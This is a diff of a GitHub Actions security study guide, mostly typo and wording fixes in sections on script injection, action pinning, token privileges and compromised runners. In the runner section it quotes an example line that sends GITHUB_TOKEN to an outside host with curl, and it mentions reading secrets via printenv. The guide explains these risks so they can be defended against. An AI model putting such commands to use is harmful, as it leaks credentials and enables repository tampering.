@@ -65,7 +65,7 @@ If you need to access the encrypted secret in your action's code, the action cod
 
 #### Use javascript actions instead of inline scripts
 
-It is recommended that you use Javascript actions that processe context values as arguments.  By definition, this usage of Javascript actions mitigates the script injection attacks as the context values are not used to generate a shell script that is executed.
+It is recommended that you use Javascript actions that process context values as arguments.  By definition, this usage of Javascript actions mitigates the script injection attacks as the context values are not used to generate a shell script that is executed.
 
 In the example below, the use of the variable as the input to a Javascript action mitigates the potential of the variable being used to facilitate a script injection attack.
 
@@ -77,7 +77,7 @@ with:
 
 #### Use intermediate environment variables in inline scripts
 
-In instances where you are using inline scripts, variables that must be injected into the action should be evaluated as environment variables.  As environment variables are evaluated before the script is generated and evaluated, using an intermediate environment variable mitigates the risk of a script injection attack.  An example is displayed below using the `github.event.pull_request.title` variable:
+In instances where you are using inline scripts, variables that must be injected into the action should be evaluated as environment variables.  As environment variables are evaluated before the script is generated and evaluated. Using an intermediate environment variable mitigates the risk of a script injection attack.  An example is displayed below using the `github.event.pull_request.title` variable:
 
 ```yml
 - name: Check PR title
@@ -93,15 +93,17 @@ In instances where you are using inline scripts, variables that must be injected
           fi
 ```
 
-#### Leverage worflow templates to implement code scanning
+#### Leverage workflow templates to implement code scanning
 
-If you click on the **Actions tab of any repository, you will be able to select **New Workflow** button on the left side of the pane.  Within the **Choose a Workflow** page that is displayed as a result of clicking the button, there is a **Security** section where workflow templates can be selected to instantiate as a workflow file in the current repository.  The CodeQL scanner, specifically, can be configured to trigger on an appropriate event to scan a branch's files & flag exposures (CWE's) in actions within workflows; including "script injection".
+If you click on the **Actions** tab of any repository, you will be able to select the **New Workflow** button on the left side of the pane.  Within the **Choose a Workflow** page that is displayed as a result of clicking on the button, there is a **Security** section where workflow templates can be selected to instantiate as a workflow file in the current repository.  The CodeQL scanner, specifically, can be configured to trigger on an appropriate event to scan a branch's files & flag exposures (CWE's) in actions within workflows; including "script injection".
 
 #### Restrict permissions for tokens
 
 You should be sure to always apply 'rule of least privilege' to any created token.  In other words, ensure the token is assigned the minimum privileges to achieve the task for which it was created.
 
 ### Identify best practices for using third-party actions securely 
+
+In the following subsections, you will find best practices for using third-party actions securely.
 
 #### Pin Actions to a Tag Only if The Author is Trusted
 
@@ -114,7 +116,7 @@ You should only pin an action to a tag ONLY if the author is trusted.  A common 
 
 #### Pin Actions to a Full Length Commit SHA
 
-By pinning an action to a full length commit SHA, you ensure, in the only way currently, you are using an immutable release of an action. You should be sure to verify tht the the SHA version of the action is in fact from the intended repository. An example of the same action used previously is displayed below:
+By pinning an action to a full length commit SHA, you ensure, in the only way currently, you are using an immutable release of an action. You should be sure to verify that the SHA version of the action is in fact from the intended repository. An example of the same action used previously is displayed below:
 
 ```yml
 - name: Checkout
@@ -131,13 +133,13 @@ The following are indicators of a trustworthy third-party action.
 - The action's entry in the GitHub Marketplace shows the 'Verified creator' badge to the right of its title. This indicates that the vendor has been verified by GitHub.
 - The action.yml file defining the action is well documented.
 
-### Use Dependabot version ipdates to keep actions up-to-date
+### Use Dependabot version updates to keep actions up-to-date
 
 You should enable Dependabot version updates for GitHub actions.  
 
 ### Potential Impact of a Compromised Runner
 
-The following subsections outline potential attack vectors adavantaging a compromised runner.
+The following subsections outline potential attack vectors that could advantage a compromised runner.
 
 #### Exfiltration of Data from a Runner
 
@@ -153,11 +155,11 @@ The compromised runner can be utilized to forward secrets, or other repository d
 
 Workflows triggered from a forked repository using the 'pull_request' event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as 'issue_comment', 'issues', 'push' and 'pull_request' from a branch within the repository. If a runner is compromised, there is a risk that repository secrets could be stolen or a job's GITHUB_TOKEN 'write' permissions could be compromised.
 
-If the secret or token is set to an environment variable, it can be directly accessed through the environment using printenv.
+-If the secret or token is set to an environment variable, it can be directly accessed through the environment using `printenv`.
 
-If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.
+-If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.
 
-For a custom action, the risk can vary depending on how an action is using the secret it obtained from the argument:
+-For a custom action, the risk can vary depending on how an action is using the secret it obtained from the argument:
 
 ```yml
 uses: exampleaction/publish@v3
@@ -178,13 +180,13 @@ curl http://example.com?token=$GITHUB_TOKEN
 
 #### Modification of Repository Contents
 
-Once the GITHUB_TOKEN is attained, an attacker-controlled system could utilize the token in calls to the GitHub Api to modify repository contents.  Restricting the GITHUB_TOKEN permissions using the rule of "least privilege' can mitigate some of this risk.
+Once the GITHUB_TOKEN is attained, an attacker-controlled system could utilize the token in calls to the GitHub Api to modify repository contents.  When you restrict the GITHUB_TOKEN permissions using the rule of "least privilege', some of the risk is mitigated.
 
 ### Managing Cross-Repository Access
 
   1. **GITHUB_TOKEN**
 
-The GITHUB_TOKEN token is intentionally scoped to the single repository that invoked the workflow, and can have the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, see Automatic token authentication. The GITHUB_TOKEN should be used whenever possible.
+The GITHUB_TOKEN token is intentionally scoped to the single repository that invokes a workflow, and can have the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, see [Automatic token authentication](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication). The GITHUB_TOKEN should be used whenever possible.
 
   2. **Repository Deploy Key**
 
